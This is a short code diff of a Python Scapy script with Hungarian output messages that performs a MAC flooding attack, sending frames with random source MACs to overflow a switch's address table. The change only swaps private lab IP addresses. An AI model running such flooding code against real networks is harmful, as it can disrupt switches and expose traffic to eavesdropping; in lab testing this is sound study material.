@@ -17,7 +17,7 @@ def main():
     print(f"[*] MAC flood indul: {count} keret a(z) {iface}-n...")
     for i in range(count):
         sendp(Ether(src=rand_mac(), dst="ff:ff:ff:ff:ff:ff") /
-              IP(src="10.10.10.66", dst="10.10.10.1") / UDP(), verbose=0)
+              IP(src="172.16.10.66", dst="172.16.10.1") / UDP(), verbose=0)
         if i % 1000 == 0:
             print(f"[+] elküldve: {i}")
     print("[!] Kész. Nézd: 'show mac address-table count' a switchen.")
